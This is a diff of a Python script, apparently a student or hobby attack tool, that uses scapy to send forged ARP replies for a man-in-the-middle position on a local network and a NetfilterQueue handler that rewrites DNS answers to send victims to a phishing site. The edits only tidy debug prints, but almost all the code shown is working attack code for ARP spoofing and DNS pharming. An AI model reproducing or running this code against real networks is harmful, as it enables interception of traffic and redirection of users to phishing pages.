@@ -35,7 +35,6 @@ def attacker():
 def ap(vip,vmac):
 	ip = netifaces.gateways()[netifaces.AF_INET][0][0]
 	mac = vmac[vip.index(ip)]
-	print(ip,mac)
 	return ip, mac
 
 def scan_net(ip):
@@ -86,7 +85,7 @@ def arp():
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
 			time.sleep(0.1)
 
-	print("arp spoffing completed.")
+	print("\narp spoffing completed.")
 	print("="*23)
 	
 
@@ -98,7 +97,6 @@ def iptables_flush():
 	subprocess.run('sudo iptables -F', shell=True)
 
 
-
 def pharm():
 	nfq = NetfilterQueue()
 	nfq.bind(1, handle_queue)
@@ -106,11 +104,9 @@ def pharm():
 
 
 def handle_queue(packet):
-	print(packet)
 	pkt = IP(packet.get_payload())
 	if pkt[DNS][DNSQR].qname == HOME_PAGE:
 		print('phishing')
-		print(pkt[DNS][DNSRR].rrname, pkt[DNS][DNSRR].rdata)
 		pkt[DNS].an = DNSRR(rrname=HOME_PAGE, rdata=TARGET_WEBSITE)
 		pkt[DNS].ancount = 1
 
@@ -120,7 +116,6 @@ def handle_queue(packet):
 		del pkt[UDP].chksum
 
 		packet.set_payload(bytes(pkt))
-		print(pkt[DNS][DNSRR].rrname, pkt[DNS][DNSRR].rdata)
 
 	packet.accept()
 
@@ -133,3 +128,4 @@ try:
 except KeyboardInterrupt:
 	forwarding(0)
 	iptables_flush()
+
